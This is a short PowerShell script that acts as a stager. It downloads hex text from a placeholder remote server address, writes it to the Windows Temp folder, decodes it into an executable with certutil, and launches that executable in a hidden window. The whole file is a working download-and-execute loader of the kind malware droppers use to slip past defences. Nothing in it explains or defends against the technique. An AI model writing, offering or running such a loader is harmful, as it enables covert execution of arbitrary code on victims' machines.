$raw = "server/to/raw/hex"
$WebClient = New-Object net.webclient

$String=$WebClient.DownloadString($raw)
$hexString = $String -replace "#","" -replace ",","" -replace "\t","" -replace "`n|`r"," " -replace "  "," " -replace "^ ",""

Add-Content -Path "C:\Windows\Temp\test" -Value $hexString
certutil -f -decodeHex "C:\Windows\Temp\test" "C:\Windows\Temp\test.exe"

Start-Process -WindowStyle hidden -FilePath "C:\Windows\Temp\test.exe"
